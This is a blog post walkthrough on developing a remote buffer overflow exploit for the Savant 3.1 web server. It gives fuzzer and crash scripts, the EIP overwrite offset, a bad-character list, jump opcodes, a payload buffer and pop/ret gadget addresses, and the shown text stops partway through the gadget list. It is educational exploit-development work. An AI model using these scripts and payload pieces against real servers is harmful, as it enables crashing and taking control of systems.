<!DOCTYPE html><html lang="en" mode="light" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Savant 3.1 webserver buffer overflow exploit | Stipe Marinovic</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Savant 3.1 webserver buffer overflow exploit" /><meta name="author" content="Stipe Marinovic" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://smarinovic.github.io/posts/Savant-web-server-BoF/" /><meta property="og:url" content="https://smarinovic.github.io/posts/Savant-web-server-BoF/" /><meta property="og:site_name" content="Stipe Marinovic" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-13T17:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Savant 3.1 webserver buffer overflow exploit" /><meta name="twitter:site" content="@stipemarinovic" /><meta name="twitter:creator" content="@Stipe Marinovic" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"https://smarinovic.github.io/posts/Savant-web-server-BoF/","headline":"Savant 3.1 webserver buffer overflow exploit","dateModified":"2020-07-13T17:00:00+02:00","datePublished":"2020-07-13T17:00:00+02:00","author":{"@type":"Person","name":"Stipe Marinovic"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://smarinovic.github.io/posts/Savant-web-server-BoF/"},"description":"Introduction","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/commons/profil.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">Stipe Marinovic</a></div><div id="site-subtitle" class="font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/smarinovic" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/stipemarinovic" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['stipe.marinovic','protonmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Savant 3.1 webserver buffer overflow exploit</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Savant 3.1 webserver buffer overflow exploit</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Mon, Jul 13, 2020, 5:00 PM +0200"> Jul 13, 2020 <i class="unloaded">2020-07-13T17:00:00+02:00</i> </span> by <span class="author"> Stipe Marinovic </span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><p>Next in a series of recreating (rewriting) remote buffer overflow exploits is Savant 3.1. Based on description from SourceForge: Savant is a freeware open source web server that runs on Windows 9x, ME, NT, 2000, and XP turning any desktop computer into a powerful web server. Application can be downloaded from: http://savant.sourceforge.net/. Vulnerability was originally discovered by muts (Mati Aharoni) years ago.</p><h2 id="fuzzing">Fuzzing</h2><p>First step in buffer overflow exploit research and development is to find a way to crash the application. Once application is crashed, we can explore the way it was crashed and see if it can be exploited in useful way. For that purpose we are using fuzzer, which is an application used to generate various payload based on user specified template. There are more than few fuzzers available today such as: Spike, Sulley, Boofuzz,… In this walkthrough we will be using python script with boofuzz module.</p><p>When we use standard python script with boofuzz module and common http template, sadly, the application doesn’t crash.</p><ul><li>Initial fuzzer</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.213'
port = 80

def main():

   session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("Sarvant GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.213", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")
   s_string("\r\n", fuzzable = False)

   session.connect(s_get("Sarvant GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
</pre></table></code></div></div><p>But if we setup <code class="language-plaintext highlighter-rouge">post_test_case_callbacks</code> function call to capture response from web server after the payload was sent, we can see that application is not always returning expected output which should start with <code class="language-plaintext highlighter-rouge">HTTP/1.1</code> following with status code (200, 301, 404 etc.) as defined in HTTP protocol. Based on that observation we can setup our fuzzer to save all payloads which didn’t return expected response in a file.</p><ul><li>Updated fuzzer</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre>#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.213'
port = 80

def receive_response(target, fuzz_data_logger, session, sock):
   data=sock.recv(20000)
   print (data)
   if not "HTTP/1.1" in data:
      f = open("savant_crash_report.txt", "a")
      f.write(session.last_send+"\n\n")
      f.close()
      
def main():

   session = Session(post_test_case_callbacks=[receive_response], sleep_time=0.2, target = Target(connection = SocketConnection(host, port, proto='tcp')))
   
   s_initialize("Sarvant GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.213", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")
   s_string("\r\n", fuzzable = False)

   session.connect(s_get("Sarvant GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
</pre></table></code></div></div><p>Once fuzzing cycle is finished, we can see that majority of payloads which didn’t returned expected response have something in common. Every payload has at least one “%” character.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_1.png?raw=true" alt="Fuzzing results" /></p><p>We can further explore this finding by writing custom fuzzer which would establish connection and send one “%” char and usual junk (for example sequence of “A”s):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>#!/usr/bin/python

import socket
import time

host = "172.16.24.213"
port = 80

for x in range (1, 5000):
   buffer = "GET /%" + x * "A" + " HTTP/1.1\r\n"
   buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((host,port))
   s.send(buffer)
   s.close()
   print ("X="+str(x))
   time.sleep(0.5)
   x=x+1
</pre></table></code></div></div><p>After 268 chars, application crashes:</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_2.png?raw=true" alt="Fuzzing results" /></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_3.png?raw=true" alt="Fuzzing results" /></p><p>Great! Now we can start to dig deeper.</p><h2 id="eip-overwrite">EIP overwrite</h2><p>Let’s attach Immunity Debugger (or OllyDbg) to application and observe behaviour. After little bit of playing with payload length we can conclude that <code class="language-plaintext highlighter-rouge">EIP</code> gets fully overwritten if we send <code class="language-plaintext highlighter-rouge">GET /%</code> plus 270 “A” characters (hex 41 equals to ASCII “A”) and <code class="language-plaintext highlighter-rouge">HTTP/1.1\r\n</code> at the end which can be seen in following screenshot (<code class="language-plaintext highlighter-rouge">ÈIP</code> is overwritten with 41414141 which equals to 4 “A” characters.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_4.png?raw=true" alt="EIP overwrite" /></p><p>But if we send 4 more characters, application crashes in a way that we don’t have control over <code class="language-plaintext highlighter-rouge">EIP</code> anymore as <code class="language-plaintext highlighter-rouge">EIP</code> is not overwritten with expected payload (<code class="language-plaintext highlighter-rouge">\x41</code>).</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_5.png?raw=true" alt="EIP overwrite fail" /></p><p>Ok, so we are limited to <code class="language-plaintext highlighter-rouge">GET /%</code> plus 270 characters and it seems that none of the registers is pointing to the beginning of the payload.<br /> But if we explore some more, we can see that <code class="language-plaintext highlighter-rouge">GET</code> keyword is close to the top of the stack (4 bytes away). In order to reach it, we would need to find address pointing to <code class="language-plaintext highlighter-rouge">pop ... ret</code>sequence. <code class="language-plaintext highlighter-rouge">pop</code> would remove 4 bytes from the stack by loading it to some register (for example <code class="language-plaintext highlighter-rouge">pop eax</code> would load 4 bytes in <code class="language-plaintext highlighter-rouge">eax</code> register) and <code class="language-plaintext highlighter-rouge">ret</code> would execute what ever is left on top of the stack (which is beginning of our payload).</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_6.png?raw=true" alt="Stack" /></p><p>By examining “follow in dump” address where <code class="language-plaintext highlighter-rouge">GET</code>is located we can see that the rest of our payload (AAAAA…) is located aprox 25 bytes further away from <code class="language-plaintext highlighter-rouge">GET</code>keyword.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_7.png?raw=true" alt="Stack" /></p><p>One more interesting thing. If we replace GET with CCC in proof of concept script as follows:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>#buffer = "GET /%" + 270 * "A" + " HTTP/1.1\r\n"
buffer = "CCC /%" + 270 * "A" + " HTTP/1.1\r\n"
</pre></table></code></div></div><p>we still get <code class="language-plaintext highlighter-rouge">EIP</code> overwritten, meaning that overflow is non dependant on <code class="language-plaintext highlighter-rouge">GET</code> keyword. This finding allow us to place opcodes for instructions we need (and we would need to jump 25 bytes in order to reach place where we could place our shellcode) instead of <code class="language-plaintext highlighter-rouge">GET</code> keyword.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_8.png?raw=true" alt="HTTP method" /></p><h2 id="finding-bad-chars">Finding bad chars</h2><p>Next step is to find bad characters which cannot be used in payload. Standard way of finding bad characters is to create a list of all characters, send it as payload and observe if application still get crashed, and if it does, are all sent characters displayed correctly.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
</pre></table></code></div></div><p>Before we send anything, we can remove <code class="language-plaintext highlighter-rouge">\x00</code> from the list as it is well known bad char. Null byte (<code class="language-plaintext highlighter-rouge">\x00</code>) is used to terminate sting and as such it breaks payload.</p><p>This vulnerability is quite interesting. If we send badchars as payload after http method (which is first couple of bytes) and <code class="language-plaintext highlighter-rouge">/%</code>we only get <code class="language-plaintext highlighter-rouge">\x00\x0a\x3f</code> as bad chars.</p><p>But when we test first couple of bytes which defines http method (GET, POST…) for bad chars we can conclude that it is more sensitive to bad chars. List of bad chars used for http method is much much longer:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>\x00\x0a\x3f\x09\x0d\x1e\x1f\x20\x21\x22\x23\x28
\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c
\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78
\x79\x7a\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9
\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4
\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xf
</pre></table></code></div></div><p>So when we are writing shell code which will be placed after <code class="language-plaintext highlighter-rouge">/%</code> we cannot use following bad characters: <code class="language-plaintext highlighter-rouge">\x00\x0a\x3f</code> but when we are overwriting first few bytes of payload (HTTP method) we cannot use following bad characters: <code class="language-plaintext highlighter-rouge">\x00\x0a\x3f\x09\x0d\x1e\x1f\x20\x21\x22\x23\x28\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xf</code></p><h2 id="jump-to-shell-code">Jump to shell code</h2><p>Next we need to find opcodes which would preform jump 25 bytes on the stack. Based on this tutorial: https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm there are two kinds of jumps which can be preformed in assembly language:</p><ul><li>Unconditional jump: this is performed by the JMP instruction. Conditional execution often involves a transfer of control to the address of an instruction that does not follow the currently executing instruction. Transfer of control may be forward, to execute a new set of instructions or backward, to re-execute the same steps.<ul><li>Conditional jump: this is performed by a set of jump instructions j<condition> depending upon the condition. The conditional instructions transfer the control by breaking the sequential flow and they do it by changing the offset value in IP.</condition></li></ul></li></ul><p>Opcodes for jump instructions can be found on following page: http://unixwiz.net/techtips/x86-jumps.html</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_9.png?raw=true" alt="opcodes" /></p><p>Unconditional jump is not possible as opcode for unconditional jump <code class="language-plaintext highlighter-rouge">\xeb</code>is badcharacter. So we need to use one of “good” characters such as following:</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_10.png?raw=true" alt="whitelist opcodes" /></p><p>Let’s use JNLE instruction. For example, we can put value x02 in AL register and compare AL with 0x1. Result of such instruction will be “not less or equal” so we could use “jump if not less of equal” (JNLP) instruction for jumping.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>nasm &gt; cmp al, 01
00000000  3C01              cmp al,0x1
nasm &gt; mov al, 02
00000000  B002              mov al,0x2
nasm &gt; 
</pre></table></code></div></div><p>Opcodes for such jump are following: <code class="language-plaintext highlighter-rouge">\xb0\x02\x3c\x01\x7f\x14</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>jump ="\xb0\x02\x3c\x01\x7f\x14"
buffer = jump + " /%" + "\x43" * (276 - len(jump)) + " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"
</pre></table></code></div></div><p>We can see that opcodes are unmodified on the stack:</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_11.png?raw=true" alt="jump opcodes on stack" /></p><p>Next, we need to find <code class="language-plaintext highlighter-rouge">POP something RET</code> instruction sequence in available modules. Mona has found more that few of them:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>0x004169a1 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a80 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a8d : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a96 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a9e : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417358 : pop edi # retn | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417362 : pop edi # retn | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004173a6 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004173b6 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004173c1 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417428 : pop edi # retn | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417457 : pop edi # retn | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004174cc : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
